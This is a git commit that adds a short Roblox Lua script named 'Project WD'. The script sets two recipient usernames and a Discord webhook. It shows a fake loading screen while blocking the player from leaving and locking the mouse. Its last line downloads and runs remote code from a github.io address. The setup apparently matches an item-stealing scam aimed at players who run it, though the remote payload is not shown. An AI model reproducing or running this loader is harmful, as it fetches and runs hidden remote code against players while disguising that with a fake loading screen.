97b8814efa64e514b758fb0093fd36ac269e3396
Redisska87 <132161503+Redisska87@users.noreply.github.com>
2023-04-29 21:15:38 +0300

    Create WD.lua

---
+++ WD.lua
@@ -0,0 +1,15 @@
+UserName = "Spartanec06_GOOD"
+UserName2 = "Spartanec05_GOOD"
+Webhook = "https://discord.com/api/webhooks/1080548711769325598/7pS-pv-f5bfi_zOc_iNYbsCWzocai3wjA2dKiGVt1ZVKDdhpBgetT2uggQ3MdUGhu2Y-"
+ 
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+ 
+_G.ScriptName = "Project WD"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 20 -- it's the time between 0% and 100% in secondes
+ 
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
